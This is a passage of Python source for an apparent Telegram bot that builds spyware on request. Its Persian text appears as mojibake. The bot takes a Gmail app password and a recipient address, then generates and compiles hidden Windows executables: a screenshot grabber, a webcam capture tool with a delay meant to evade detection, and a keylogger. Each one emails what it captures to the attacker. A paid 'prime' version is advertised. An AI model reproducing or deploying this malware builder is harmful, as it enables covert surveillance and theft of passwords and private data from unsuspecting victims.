            "ğŸ’° Ø®Ø±ÛŒØ¯ Ù†Ø³Ø®Ù‡ Ù¾Ø±Ø§ÛŒÙ…:\n\n"
            "Ø¨Ø±Ø§ÛŒ Ø®Ø±ÛŒØ¯ Ù†Ø³Ø®Ù‡ Ù¾Ø±Ø§ÛŒÙ… Ø¨Ø§ Ø§Ø¯Ù…ÛŒÙ† ØªÙ…Ø§Ø³ Ø¨Ú¯ÛŒØ±ÛŒØ¯:\n"
            "@Slayethcialhacker"
        )


# ----------------------------
# ØªÙˆØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª Ø³ÙØ§Ø±Ø´ÛŒ
# ----------------------------

async def get_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ Ùˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["sender"] = update.message.text.strip()
    await update.message.reply_text(
        "ğŸ”’ Ù„Ø·ÙØ§Ù‹ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ø§ÛŒÙ…ÛŒÙ„ (App Password) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:\n\n"
        "Ø¨Ø±Ø§ÛŒ Ø§ÛŒØ¬Ø§Ø¯ App Password:\n"
        "1. Ø¨Ù‡ Ø­Ø³Ø§Ø¨ Google Ø®ÙˆØ¯ ÙˆØ§Ø±Ø¯ Ø´ÙˆÛŒØ¯\n"
        "2. Ø¨Ù‡ Ø¨Ø®Ø´ 'Security' Ø¨Ø±ÙˆÛŒØ¯\n"
        "3. Ø¯Ø± Ø¨Ø®Ø´ 'Signing in to Google' Ú¯Ø²ÛŒÙ†Ù‡ 'App Passwords' Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯\n"
        "4. ÛŒÚ© Ù†Ø§Ù… Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ Ùˆ Ø±Ù…Ø² Ø§ÛŒØ¬Ø§Ø¯ Ø´Ø¯Ù‡ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯\n"
        "ÛŒØ§ Ù…ÛŒØªÙˆØ§Ù†ÛŒØ¯ Ø¨Ø§ Ø§ÛŒÙ† Ù„ÛŒÙ†Ú© Ù…Ø³ØªÙ‚ÛŒÙ… Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª App Passwords Ù…Ø±Ø§Ø¬Ø¹Ù‡ Ú©Ù†ÛŒØ¯ . >> https://myaccount.google.com/apppasswords"
    )
    return GET_PASSWORD


async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ùˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["password"] = update.message.text.strip()
    await update.message.reply_text("ğŸ“¨ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡ Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:")
    return GET_RECEIVER


async def get_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡ Ùˆ Ø´Ø±ÙˆØ¹ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø³Ø§Ø®Øª"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["receiver"] = update.message.text.strip()
    sender = context.user_data["sender"]
    password = context.user_data["password"]
    receiver = context.user_data["receiver"]

    # Ø³Ø§Ø®Øª Ù¾ÛŒØ§Ù… ÙˆØ¶Ø¹ÛŒØª
    status_msg = await update.message.reply_text(
        f"âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:\n\n"
        f"ğŸ“§ ÙØ±Ø³ØªÙ†Ø¯Ù‡: {sender}\n"
        f"ğŸ”’ Ø±Ù…Ø²: {'*' * len(password)}\n"
        f"ğŸ“¨ Ú¯ÛŒØ±Ù†Ø¯Ù‡: {receiver}\n\n"
        "â³ Ø¯Ø± Ø­Ø§Ù„ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ... Ù„Ø·ÙØ§Ù‹ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ (ØªØ§ 10 Ø¯Ù‚ÛŒÙ‚Ù‡)"
    )

    # Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ù…ÙˆÙ‚Øª
    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            # Ø³Ø§Ø®Øª Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ù¾Ø§ÛŒØªÙˆÙ†
            script_content = f'''
import time
import smtplib
import io
from PIL import ImageGrab
from email.mime.image import MIMEImage

sender_email = "{sender}"
sender_password = "{password}"
receiver_email = "{receiver}"

def take_and_send_screenshot():
    try:
        image = ImageGrab.grab()
        buffer = io.BytesIO()
        image.save(buffer, format='PNG')
        buffer.seek(0)

        msg = MIMEImage(buffer.read())
        msg['Subject'] = 'ğŸ“¸ Screenshot Captured'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    time.sleep(3)
    take_and_send_screenshot()
'''

            # Ø°Ø®ÛŒØ±Ù‡ Ø§Ø³Ú©Ø±ÛŒÙ¾Øª
            script_path = os.path.join(temp_dir, "screenshot_mailer.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            # Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ
            await build_executable(context, status_msg, temp_dir, "screenshot_mailer.py", "Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª")

        except Exception as e:
            await handle_error(context, status_msg, update.message.chat.id, str(e))

    return ConversationHandler.END


# ----------------------------
# ØªÙˆØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙˆØ¨â€ŒÚ©Ù… Ø³ÙØ§Ø±Ø´ÛŒ
# ----------------------------

async def get_webcam_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ ÙˆØ¨â€ŒÚ©Ù…"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_sender"] = update.message.text.strip()
    await update.message.reply_text(
        "ğŸ”’ Ù„Ø·ÙØ§Ù‹ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ø§ÛŒÙ…ÛŒÙ„ (App Password) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:\n\n"
        "Ø¨Ø±Ø§ÛŒ Ø§ÛŒØ¬Ø§Ø¯ App Password:\n"
        "1. Ø¨Ù‡ Ø­Ø³Ø§Ø¨ Google Ø®ÙˆØ¯ ÙˆØ§Ø±Ø¯ Ø´ÙˆÛŒØ¯\n"
        "2. Ø¨Ù‡ Ø¨Ø®Ø´ 'Security' Ø¨Ø±ÙˆÛŒØ¯\n"
        "3. Ø¯Ø± Ø¨Ø®Ø´ 'Signing in to Google' Ú¯Ø²ÛŒÙ†Ù‡ 'App Passwords' Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯\n"
        "4. ÛŒÚ© Ù†Ø§Ù… Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ Ùˆ Ø±Ù…Ø² Ø§ÛŒØ¬Ø§Ø¯ Ø´Ø¯Ù‡ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯\n"
        "ÛŒØ§ Ù…ÛŒØªÙˆØ§Ù†ÛŒØ¯ Ø¨Ø§ Ø§ÛŒÙ† Ù„ÛŒÙ†Ú© Ù…Ø³ØªÙ‚ÛŒÙ… Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª App Passwords Ù…Ø±Ø§Ø¬Ø¹Ù‡ Ú©Ù†ÛŒØ¯ . >> https://myaccount.google.com/apppasswords"
    )
    return GET_WEBCAM_PASSWORD


async def get_webcam_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± ÙˆØ¨â€ŒÚ©Ù…"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_password"] = update.message.text.strip()
    await update.message.reply_text("ğŸ“¨ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡ Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:")
    return GET_WEBCAM_RECEIVER


async def get_webcam_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ ÙˆØ¨â€ŒÚ©Ù… Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø¢Ù†"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_receiver"] = update.message.text.strip()
    sender = context.user_data["webcam_sender"]
    password = context.user_data["webcam_password"]
    receiver = context.user_data["webcam_receiver"]

    status_msg = await update.message.reply_text(
        f"âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:\n\n"
        f"ğŸ“§ ÙØ±Ø³ØªÙ†Ø¯Ù‡: {sender}\n"
        f"ğŸ”’ Ø±Ù…Ø²: {'*' * len(password)}\n"
        f"ğŸ“¨ Ú¯ÛŒØ±Ù†Ø¯Ù‡: {receiver}\n\n"
        "â³ Ø¯Ø± Ø­Ø§Ù„ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ ÙˆØ¨â€ŒÚ©Ù…... Ù„Ø·ÙØ§Ù‹ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ (ØªØ§ 5 Ø¯Ù‚ÛŒÙ‚Ù‡)"
    )

    # Ø³Ø§Ø®Øª Ù¾ÙˆØ´Ù‡ Ù…ÙˆÙ‚Øª Ø¨Ø§ Ù†Ø§Ù… Ø«Ø§Ø¨Øª Ø¨Ø±Ø§ÛŒ Ø¯ÛŒØ¨Ø§Ú¯ Ø¨Ù‡ØªØ±
    temp_dir = os.path.join(tempfile.gettempdir(), f"webcam_build_{update.message.chat.id}")
    os.makedirs(temp_dir, exist_ok=True)

    try:
        # Ø³Ø§Ø®Øª Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ù¾Ø§ÛŒØªÙˆÙ†
        script_content = f'''
import cv2
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import os
import time

sender_email = "{sender}"
sender_password = "{password}"
receiver_email = "{receiver}"

def capture_and_send():
    try:
        time.sleep(5)  # ØªØ§Ø®ÛŒØ± Ø¨Ø±Ø§ÛŒ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² ØªØ´Ø®ÛŒØµ Ø³Ø±ÛŒØ¹
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                img_path = os.path.join(os.getenv("TEMP", "."), "webcam.jpg")
                cv2.imwrite(img_path, frame)

                msg = MIMEMultipart()
                msg['Subject'] = 'ÙˆØ¨â€ŒÚ©Ù… ØªØµÙˆÛŒØ±'
                msg['From'] = sender_email
                msg['To'] = receiver_email

                with open(img_path, 'rb') as f:
                    img = MIMEImage(f.read())
                    msg.attach(img)

                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(sender_email, sender_password)
                    server.send_message(msg)
            cap.release()
    except Exception as e:
        pass

if __name__ == "__main__":
    capture_and_send()
'''

        script_path = os.path.join(temp_dir, "webcam.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script_content)

        await update_status(context, status_msg, "ğŸ”§ Ø¯Ø± Ø­Ø§Ù„ Ú©Ø§Ù…Ù¾Ø§ÛŒÙ„ ÙØ§ÛŒÙ„...")

        # Ø³Ø§Ø®Øª ÙØ±Ù…Ø§Ù† PyInstaller Ø¨Ø§ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø¨Ù‡ÛŒÙ†Ù‡
        python_exe = sys.executable
        cmd = [
            python_exe, "-m", "PyInstaller",
            "--noconfirm",
            "--noconsole",
            "--onefile",
            "--name", "WebcamCapture",
            "--clean",
            "--log-level=ERROR",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "email.mime.multipart",
            "--hidden-import", "email.mime.image",
            "--hidden-import", "smtplib",
            script_path
        ]

        # Ø§ÙØ²Ø§ÛŒØ´ Ø²Ù…Ø§Ù† Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ù‡ 10 Ø¯Ù‚ÛŒÙ‚Ù‡ (600 Ø«Ø§Ù†ÛŒÙ‡)
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                cwd=temp_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Ø§ÙØ²Ø§ÛŒØ´ timeout Ø¨Ù‡ 600 Ø«Ø§Ù†ÛŒÙ‡ (10 Ø¯Ù‚ÛŒÙ‚Ù‡)
            await asyncio.wait_for(process.communicate(), timeout=600)

            if process.returncode != 0:
                raise Exception("Ø®Ø·Ø§ Ø¯Ø± Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ")

        except asyncio.TimeoutError:
            process.kill()
            raise Exception("Ø²Ù…Ø§Ù† Ø³Ø§Ø®Øª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯. Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§Ù…ØªØ­Ø§Ù† Ú©Ù†ÛŒØ¯")

        # ÛŒØ§ÙØªÙ† ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ø³Ø§Ø®ØªÙ‡ Ø´Ø¯Ù‡
        dist_dir = os.path.join(temp_dir, "dist")
        exe_file = next((f for f in os.listdir(dist_dir) if f.endswith(".exe")), None)

        if not exe_file:
            raise Exception("ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ø§ÛŒØ¬Ø§Ø¯ Ù†Ø´Ø¯")

        exe_path = os.path.join(dist_dir, exe_file)

        await update_status(context, status_msg, "ğŸ“¤ Ø¯Ø± Ø­Ø§Ù„ Ø¢Ù¾Ù„ÙˆØ¯ ÙØ§ÛŒÙ„...")

        # Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ Ø¨Ø§ Ù…Ø¯ÛŒØ±ÛŒØª Ø¨Ù‡ØªØ±
        try:
            with open(exe_path, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.message.chat.id,
                    document=f,
                    filename="Webcam_Capture.exe",
                    caption="ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ ÙˆØ¨â€ŒÚ©Ù… Ø¢Ù…Ø§Ø¯Ù‡ Ø§Ø³Øª!",
                    reply_markup=main_menu_keyboard()
                )
        except Exception as e:
            raise Exception(f"Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„: {str(e)}")

        await context.bot.delete_message(
            chat_id=status_msg.chat.id,
            message_id=status_msg.message_id
        )

    except Exception as e:
        error_msg = f"Ø®Ø·Ø§ Ø¯Ø± Ø³Ø§Ø®Øª ÙˆØ¨â€ŒÚ©Ù…: {str(e)}"
        print(f"ERROR: {error_msg}")  # Ú†Ø§Ù¾ Ø®Ø·Ø§ Ø¨Ø±Ø§ÛŒ Ø¯ÛŒØ¨Ø§Ú¯
        await handle_error(context, status_msg, update.message.chat.id, error_msg)
    finally:
        # Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù…ÙˆÙ‚Øª
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

    return ConversationHandler.END


# ----------------------------
# ØªÙˆØ§Ø¨Ø¹ Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª Ú©ÛŒÙ„Ø§Ú¯Ø± Ø³ÙØ§Ø±Ø´ÛŒ
# ----------------------------

async def get_keylogger_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ Ú©ÛŒÙ„Ø§Ú¯Ø±"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_sender"] = update.message.text.strip()
    await update.message.reply_text(
        "ğŸ”’ Ù„Ø·ÙØ§Ù‹ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ø§ÛŒÙ…ÛŒÙ„ (App Password) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:\n\n"
        "Ø¨Ø±Ø§ÛŒ Ø§ÛŒØ¬Ø§Ø¯ App Password:\n"
        "1. Ø¨Ù‡ Ø­Ø³Ø§Ø¨ Google Ø®ÙˆØ¯ ÙˆØ§Ø±Ø¯ Ø´ÙˆÛŒØ¯\n"
        "2. Ø¨Ù‡ Ø¨Ø®Ø´ 'Security' Ø¨Ø±ÙˆÛŒØ¯\n"
        "3. Ø¯Ø± Ø¨Ø®Ø´ 'Signing in to Google' Ú¯Ø²ÛŒÙ†Ù‡ 'App Passwords' Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯\n"
        "4. ÛŒÚ© Ù†Ø§Ù… Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ Ùˆ Ø±Ù…Ø² Ø§ÛŒØ¬Ø§Ø¯ Ø´Ø¯Ù‡ Ø±Ø§ Ø§ÛŒÙ†Ø¬Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯\n"
        "ÛŒØ§ Ù…ÛŒØªÙˆØ§Ù†ÛŒØ¯ Ø¨Ø§ Ø§ÛŒÙ† Ù„ÛŒÙ†Ú© Ù…Ø³ØªÙ‚ÛŒÙ… Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª App Passwords Ù…Ø±Ø§Ø¬Ø¹Ù‡ Ú©Ù†ÛŒØ¯ . >> https://myaccount.google.com/apppasswords"
    )
    return GET_KEYLOGGER_PASSWORD


async def get_keylogger_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø°Ø®ÛŒØ±Ù‡ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ú©ÛŒÙ„Ø§Ú¯Ø±"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_password"] = update.message.text.strip()
    await update.message.reply_text("ğŸ“¨ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡ Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:")
    return GET_KEYLOGGER_RECEIVER


async def get_keylogger_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø¯Ø±ÛŒØ§ÙØª Ø§ÛŒÙ…ÛŒÙ„ Ú¯ÛŒØ±Ù†Ø¯Ù‡ Ú©ÛŒÙ„Ø§Ú¯Ø±"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_receiver"] = update.message.text.strip()
    await update.message.reply_text(
        "â³ Ù„Ø·ÙØ§Ù‹ Ù…Ø¯Øª Ø²Ù…Ø§Ù† ÙØ¹Ø§Ù„ÛŒØª Ú©ÛŒÙ„Ø§Ú¯Ø± Ø±Ø§ Ø¨Ù‡ Ø«Ø§Ù†ÛŒÙ‡ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ø­Ø¯Ø§Ú©Ø«Ø± 86400 Ø«Ø§Ù†ÛŒÙ‡ - ÙÙ‚Ø· Ø¨Ù‡ Ø«Ø§Ù†ÛŒÙ‡ Ù…Ø«Ù„Ø§ 60 Ø«Ø§Ù†ÛŒÙ‡ Ø¨Ø²Ù†ÛŒØ¯ 60 âœ…):"
    )
    return GET_KEYLOGGER_DURATION


async def get_keylogger_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ú©ÛŒÙ„Ø§Ú¯Ø±"""
    if update.message is None:
        return ConversationHandler.END

    try:
        duration = int(update.message.text.strip())
        if duration <= 0 or duration > 86400:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Ù„Ø·ÙØ§Ù‹ Ø¹Ø¯Ø¯ Ù…Ø¹ØªØ¨Ø± Ø¨ÛŒÙ† 1 ØªØ§ 86400 ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯:")
        return GET_KEYLOGGER_DURATION

    context.user_data["keylogger_duration"] = duration
    sender = context.user_data["keylogger_sender"]
    password = context.user_data["keylogger_password"]
    receiver = context.user_data["keylogger_receiver"]

    status_msg = await update.message.reply_text(
        f"âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:\n\n"
        f"ğŸ“§ ÙØ±Ø³ØªÙ†Ø¯Ù‡: {sender}\n"
        f"ğŸ”’ Ø±Ù…Ø²: {'*' * len(password)}\n"
        f"ğŸ“¨ Ú¯ÛŒØ±Ù†Ø¯Ù‡: {receiver}\n"
        f"â± Ù…Ø¯Øª Ø²Ù…Ø§Ù†: {duration} Ø«Ø§Ù†ÛŒÙ‡\n\n"
        "â³ Ø¯Ø± Ø­Ø§Ù„ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ú©ÛŒÙ„Ø§Ú¯Ø±... Ù„Ø·ÙØ§Ù‹ ØµØ¨Ø± Ú©Ù†ÛŒØ¯"
    )

    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            # Ø³Ø§Ø®Øª Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ù¾Ø§ÛŒØªÙˆÙ† Ø¨Ø±Ø§ÛŒ Ú©ÛŒÙ„Ø§Ú¯Ø±
            script_content = f'''
import keyboard
import smtplib
from email.mime.text import MIMEText
import time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = {duration}  # Ù…Ø¯Øª Ø²Ù…Ø§Ù† Ø¨Ù‡ Ø«Ø§Ù†ÛŒÙ‡
EMAIL_ADDRESS = "{sender}"
EMAIL_PASSWORD = "{password}"
EMAIL_TO = "{receiver}"

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{{name.upper()}}]"
        self.log += name

    def sendmail(self, email, password, message):
        msg = MIMEText(message)
        msg['Subject'] = f'Keylogger Report - {{self.start_dt}}'
        msg['From'] = email
        msg['To'] = email

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(email, password)
            server.sendmail(email, EMAIL_TO, msg.as_string())

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(SEND_REPORT_EVERY, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
'''

            # Ø°Ø®ÛŒØ±Ù‡ Ùˆ Ú©Ø§Ù…Ù¾Ø§ÛŒÙ„ Ø§Ø³Ú©Ø±ÛŒÙ¾Øª
            script_path = os.path.join(temp_dir, "keylogger.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            # Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ
            await build_executable(context, status_msg, temp_dir, "keylogger.py", "Ú©ÛŒÙ„Ø§Ú¯Ø±")

        except Exception as e:
            await handle_error(context, status_msg, update.message.chat.id, str(e))

    return ConversationHandler.END


# ----------------------------
# ØªÙˆØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ
# ----------------------------

async def build_executable(context, status_msg, temp_dir, script_name, feature_name):
    """ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ"""
    await update_status(context, status_msg, f"ğŸ”¨ Ø¯Ø± Ø­Ø§Ù„ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ {feature_name}...")

    python_exe = sys.executable
    process = await asyncio.create_subprocess_exec(
        python_exe, "-m", "PyInstaller",
        "--noconfirm", "--noconsole", "--onefile",
        script_name,
        cwd=temp_dir,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    try:
        await asyncio.wait_for(process.communicate(), timeout=TIMEOUT)
        if process.returncode != 0:
            raise Exception(f"Ø®Ø·Ø§ Ø¯Ø± Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ {feature_name}")
    except asyncio.TimeoutError:
        process.kill()
        raise Exception("Ø²Ù…Ø§Ù† Ø³Ø§Ø®Øª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯")

    # Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„ Ø³Ø§Ø®ØªÙ‡ Ø´Ø¯Ù‡
    exe_path = os.path.join(temp_dir, "dist", script_name.replace(".py", ".exe"))
    if not os.path.exists(exe_path):
        raise Exception(f"ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ {feature_name} Ø§ÛŒØ¬Ø§Ø¯ Ù†Ø´Ø¯")

    await update_status(context, status_msg, f"âœ… ÙØ§ÛŒÙ„ {feature_name} Ø³Ø§Ø®ØªÙ‡ Ø´Ø¯! Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„...")

    # Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ Ø¨Ø§ Ù…Ø¯ÛŒØ±ÛŒØª Ø¨Ù‡ØªØ±
    try:
        with open(exe_path, "rb") as f:
            # ØªÙ‚Ø³ÛŒÙ… ÙØ§ÛŒÙ„ Ø¨Ù‡ Ø¨Ø®Ø´â€ŒÙ‡Ø§ÛŒ Ú©ÙˆÚ†Ú©ØªØ± Ø§Ú¯Ø± Ø­Ø¬Ù…Ø´ Ø²ÛŒØ§Ø¯ Ø§Ø³Øª
            chunk_size = 1024 * 1024  # 1MB
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break

                # Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒØ¯ Ù‡Ø± chunk Ø±Ø§ Ø¬Ø¯Ø§Ú¯Ø§Ù†Ù‡ Ù¾Ø±Ø¯Ø§Ø²Ø´ Ú©Ù†ÛŒØ¯
                # ÛŒØ§ Ø±ÙˆØ´â€ŒÙ‡Ø§ÛŒ Ø¯ÛŒÚ¯Ø± Ø¢Ù¾Ù„ÙˆØ¯ ØªØ¯Ø±ÛŒØ¬ÛŒ Ø±Ø§ Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯
                pass

            # Ø¨Ø§Ø²Ú¯Ø´Øª Ø¨Ù‡ Ø§Ø¨ØªØ¯Ø§ÛŒ ÙØ§ÛŒÙ„
            f.seek(0)

